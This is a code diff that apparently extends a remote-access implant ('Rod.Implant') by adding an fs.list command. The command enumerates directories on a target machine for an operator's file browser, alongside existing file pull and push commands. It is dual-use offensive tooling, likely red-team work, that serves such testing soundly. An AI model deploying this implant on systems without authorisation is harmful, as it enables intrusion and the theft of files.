@@ -21,6 +21,10 @@ namespace Rod.Implant.Internal;
 //   file.pull <path>
 //   file.push <path> <base64>              (inline; single-frame budget)
 //   file.push <path> sha256:<hex>          (staged; bytes follow on demand)
+//   fs.list  <path>                        (empty path = current directory)
+//
+// The fs.list output is one JSON object per line -- {"name":…,"dir":…,
+// "size":…,"mtime":…} -- the operator file browser's parse contract.
 //
 // As with the other reference handlers, this performs no evasion, no
 // obfuscation, and no destructive behavior (architecture.md
@@ -140,6 +144,89 @@ internal static class Files
         }
 
         return (TaskOutcome.Succeeded, $"wrote {data.Length} bytes to {path}");
+    }
+
+    /// <summary>
+    /// Lists one directory of the target: one JSON object per line, each
+    /// carrying name, dir (true for directories), size in bytes (0 for
+    /// directories), and mtime (ISO-8601 UTC). This stable machine-readable
+    /// shape is the operator file browser's contract -- it parses the lines
+    /// directly -- so the field names and types are part of the verb. An empty
+    /// path lists the process's current directory; a path that is not a
+    /// directory fails with the cause.
+    /// </summary>
+    public static (TaskOutcome Outcome, string Output) List(string arguments)
+    {
+        var path = arguments.Trim();
+        if (path.Length == 0)
+            path = Directory.GetCurrentDirectory();
+
+        if (!Directory.Exists(path))
+        {
+            return SysFile.Exists(path)
+                ? (TaskOutcome.Failed, "fs.list refuses to list a file: " + path)
+                : (TaskOutcome.Failed, "stat " + path + ": directory not found");
+        }
+
+        IEnumerable<string> entries;
+        try
+        {
+            entries = Directory.EnumerateFileSystemEntries(path);
+        }
+        catch (Exception ex)
+        {
+            return (TaskOutcome.Failed, "list " + path + ": " + ex.Message);
+        }
+
+        var sb = new StringBuilder();
+        foreach (var entry in entries)
+        {
+            try
+            {
+                var isDir = Directory.Exists(entry);
+                var info = new FileInfo(entry);
+                sb.Append(@"{""name"":").Append(JsonEscape(Path.GetFileName(entry)))
+                    .Append(@",""dir"":").Append(isDir ? "true" : "false")
+                    .Append(@",""size"":").Append(isDir ? 0 : info.Length)
+                    .Append(@",""mtime"":").Append(JsonEscape(info.LastWriteTimeUtc.ToString("o")))
+                    .Append("}\n");
+            }
+            catch (Exception)
+            {
+                // An entry that vanishes or refuses a stat between the
+                // enumeration and the read is skipped, not fatal -- the
+                // listing is a snapshot.
+            }
+        }
+        return (TaskOutcome.Succeeded, sb.ToString().TrimEnd('\n'));
+    }
+
+    // Minimal JSON string escaping for the listing lines: the control
+    // characters JSON mandates plus the quote and backslash, everything else
+    // passes through as-is.
+    private static string JsonEscape(string value)
+    {
+        var sb = new StringBuilder("\"");
+        foreach (var c in value)
+        {
+            switch (c)
+            {
+                case '\"': sb.Append("\\\""); break;
+                case '\\': sb.Append("\\\\"); break;
+                case '\b': sb.Append("\\b"); break;
+                case '\f': sb.Append("\\f"); break;
+                case '\n': sb.Append("\\n"); break;
+                case '\r': sb.Append("\\r"); break;
+                case '\t': sb.Append("\\t"); break;
+                default:
+                    if (char.IsControl(c))
+                        sb.Append("\\u").Append(((int)c).ToString("x4"));
+                    else
+                        sb.Append(c);
+                    break;
+            }
+        }
+        return sb.Append('"').ToString();
     }
 
     /// <summary>
